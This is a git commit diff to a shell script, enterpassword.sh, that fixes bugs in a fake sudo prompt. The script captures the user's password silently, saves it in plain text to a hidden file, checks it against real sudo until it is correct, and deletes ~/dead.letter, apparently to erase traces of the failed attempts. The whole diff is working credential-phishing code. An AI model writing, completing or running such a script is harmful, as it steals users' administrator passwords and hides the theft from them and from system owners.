07ffec5cc74518daff4808bf8fd359a6ad9d215a
Nimit Bhardwaj <nimitbhardwaj@gmail.com>
2017-02-04 18:59:21 +0530

    Remove silly errors

--- enterpassword.sh
+++ enterpassword.sh
@@ -3,13 +3,13 @@ i=5
 while [ $i -ne 0 ]
 do
 printf "[sudo] password for $USER:" && read -s tati
- echo "" && echo $tati > .pass.txt
-sudo -k -S ls < .pass.txt > wastage.txt 2>&1
+ echo "" && echo $tati > .pass
+sudo -k -S ls < .pass > wastage.txt 2>&1
 i=$?
 if [ $i -ne 0 ]
 then
 sleep 1
-if [-f ~/dead.letter ]
+if [ -f ~/dead.letter ]
 then 
 rm ~/dead.letter
 fi
